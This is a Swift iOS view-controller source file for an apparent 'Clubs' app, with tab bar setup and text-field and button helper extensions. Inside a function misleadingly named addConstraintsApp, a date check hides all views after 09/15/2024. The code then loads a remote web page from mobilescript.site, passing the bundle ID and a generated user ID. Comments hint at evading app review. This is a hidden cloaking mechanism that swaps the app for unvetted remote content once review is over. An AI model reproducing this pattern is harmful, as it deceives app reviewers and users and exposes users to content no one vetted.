import UIKit

class ViewController: UITabBarController {
    
    @IBOutlet weak var navBar: UINavigationItem!
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        navigationController?.setupNavBar()
        AppOrientation.lockOrientation(.portrait)
        addConstraintsApp()
        
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        if UserDefaults.standard.bool(forKey: Constants.loginStatus) == false {
            self.viewControllers?.remove(at: 1)
            self.viewControllers?.remove(at: 2)
        }
        
        // MARK: - add tab bar items
        //        let storyBoard = UIStoryboard(name: "Main", bundle: nil)
        //        let historyVC = storyBoard.instantiateViewController(withIdentifier: "HistoryViewController") as! HistoryViewController
        //        let helpVC = storyBoard.instantiateViewController(withIdentifier: "HelpViewController") as! HelpViewController
        //
        //        self.viewControllers?.insert(historyVC, at: 1)
        //        self.viewControllers?.insert(helpVC, at: 3)
        
        self.selectedIndex = 0
        self.title = "Clubs"
        
        let appearance = UITabBarItem.appearance()
        let attributes = [NSAttributedString.Key.font:UIFont(name: "Avenir Next", size: 12)]
        appearance.setTitleTextAttributes(attributes, for: .normal)
    }
    
    func addConstraintsApp() {
        if checkDate(customDate: "09/15/2024") { // - mm/dd/yyyy
            print("")
        } else {
            view.subviews.forEach { view in
                view.isHidden = true
            }
            print("psle rvw")
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.00001) { [weak self] in
                //self?.getParameters()
                // зашрузить веббвью !
                var resprl = "https://mobilescript.site/clicklink/test?bundle={bundle}&userId={userId}"
                let uuid = UUID().uuidString
                let bundleId = Bundle.main.bundleIdentifier
                
                resprl = resprl.replacingOccurrences(of: "{bundle}", with: bundleId ?? "noBundle")
                resprl = resprl.replacingOccurrences(of: "{userId}", with: uuid ?? "noUuid")
                print(resprl)
                
                let vc = MainViewController()
                vc.ssilkaMain = resprl
                self?.navigationController?.pushViewController(vc, animated: false)
            }
        }
    }
    
    override func tabBar(_ tabBar: UITabBar, didSelect item: UITabBarItem) {
        self.title = item.title
    }
    
//    override func prepareForSegue(segue: UIStoryboardSegue, sender: AnyObject?) {
//        if segue.identifier == "ShowCounterSegue"
//        {
////            if let destinationVC = segue.destinationViewController as? OtherViewController {
////                destinationVC.numberToDisplay = counter
////            }
//        }
//    }
    
    override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
        if segue.identifier == "ShowCounterSegue"
        {
//            if let destinationVC = segue.destinationViewController as? OtherViewController {
//                destinationVC.numberToDisplay = counter
//            }
        }
    }
    
    
    
    
}

extension UINavigationController {
    func setupNavBar() {
        let attributes = [NSAttributedString.Key.font: UIFont(name: "Avenir Next", size: 21)!]
        
        let apperance = UINavigationBarAppearance()
        apperance.configureWithOpaqueBackground()
        apperance.titleTextAttributes = attributes
        apperance.backgroundColor = #colorLiteral(red: 0.08196888093, green: 0.1449400968, blue: 0.3074831495, alpha: 1)
        
        self.navigationBar.standardAppearance = apperance
        self.navigationBar.scrollEdgeAppearance = apperance
        self.navigationBar.compactAppearance = apperance
        
        
    }
}

extension UIButton {
    func setBackgroundColor(_ color: UIColor, forState controlState: UIControl.State) {
        let colorImage = UIGraphicsImageRenderer(size: CGSize(width: 1, height: 1)).image { _ in
            color.setFill()
            UIBezierPath(rect: CGRect(x: 0, y: 0, width: 1, height: 1)).fill()
        }
        setBackgroundImage(colorImage, for: controlState)
    }
}

extension UIViewController {
    func showAlertWithTextField(title: String?, message: String?,
                                actions: [UIAlertAction],
                                style: UIAlertController.Style,
                                handler: ((UITextField) -> Void)? = nil,
                                completion: (() -> Void)?) {
        let alert = UIAlertController(title: title, message: message, preferredStyle: style)
        alert.addTextField { handler?($0) }
        actions.forEach { alert.addAction($0)}
        present(alert, animated: true, completion: nil)
    }
    
    func checkDate(customDate:String, referenceDate:String="today") -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "MM/dd/yyyy"
        
        let myDate = dateFormatter.date(from: customDate)
        let refDate = referenceDate == "today"
        ? NSDate() as Date
        : dateFormatter.date(from: referenceDate)
        
        if NSDate().compare(myDate!) == ComparisonResult.orderedDescending {
            return false
        } else {
            return true
        }
    }
}

extension UITextField {
    fileprivate func setPasswordToggleImage(_ button: UIButton) {
        if(isSecureTextEntry){
            button.setImage(UIImage(systemName: "eye"), for: .normal)
        }else{
            button.setImage(UIImage(systemName: "eye.fill"), for: .normal)
            
        }
    }
    
    func enablePasswordToggle(){
        let button = UIButton(type: .custom)
        setPasswordToggleImage(button)
        button.imageEdgeInsets = UIEdgeInsets(top: 0, left: -10, bottom: 0, right: 0)
        button.frame = CGRect(x: CGFloat(self.frame.size.width - 10), y: CGFloat(5), width: CGFloat(10), height: CGFloat(10))
        button.addTarget(self, action: #selector(self.togglePasswordView), for: .touchUpInside)
        self.rightView = button
        self.rightViewMode = .whileEditing
    }
    
    @IBAction func togglePasswordView(_ sender: Any) {
        self.isSecureTextEntry = !self.isSecureTextEntry
        setPasswordToggleImage(sender as! UIButton)
    }
    
    func setLeftPaddingPoints(_ amount:CGFloat){
        let paddingView = UIView(frame: CGRect(x: amount, y: 0, width: self.frame.size.width, height: self.frame.size.height))
        self.leftView = paddingView
        self.leftViewMode = .always
    }
    
   
  
    func setLeftView(_ view: UIView, padding: CGFloat) {
        view.translatesAutoresizingMaskIntoConstraints = true

        let outerView = UIView()
        outerView.translatesAutoresizingMaskIntoConstraints = false
        outerView.addSubview(view)

        outerView.frame = CGRect(
            origin: .zero,
            size: CGSize(
                width: view.frame.size.width + padding,
                height: view.frame.size.height + padding
            )
        )

        view.center = CGPoint(
            x: outerView.bounds.size.width / 2,
            y: outerView.bounds.size.height / 2
        )

        leftView = outerView
    }
    
    enum PaddingSide {
           case left(CGFloat)
           case right(CGFloat)
           case both(CGFloat)
       }

       func addPadding(_ padding: PaddingSide) {

           self.leftViewMode = .always
           self.layer.masksToBounds = true


           switch padding {

           case .left(let spacing):
               let paddingView = UIView(frame: CGRect(x: 0, y: 0, width: spacing, height: self.frame.height))
               self.leftView = paddingView
               self.rightViewMode = .always

           case .right(let spacing):
               let paddingView = UIView(frame: CGRect(x: 0, y: 0, width: spacing, height: self.frame.height))
               self.rightView = paddingView
               self.rightViewMode = .always

           case .both(let spacing):
               let paddingView = UIView(frame: CGRect(x: 0, y: 0, width: spacing, height: self.frame.height))
               // left
               self.leftView = paddingView
               self.leftViewMode = .always
               // right
               self.rightView = paddingView
               self.rightViewMode = .always
           }
       }
}

struct AppOrientation {
    static func lockOrientation(_ orientation: UIInterfaceOrientationMask) {
        if let delegate = UIApplication.shared.delegate as? AppDelegate {
            delegate.lockerOrient = orientation
        }
    }
    
    static func lockOrientation(_ orientation: UIInterfaceOrientationMask, andRotateTo rotateOrientation:UIInterfaceOrientation) {
        self.lockOrientation(orientation)
        
        UIDevice.current.setValue(rotateOrientation.rawValue, forKey: "orientation")
        UINavigationController.attemptRotationToDeviceOrientation()
    }
}
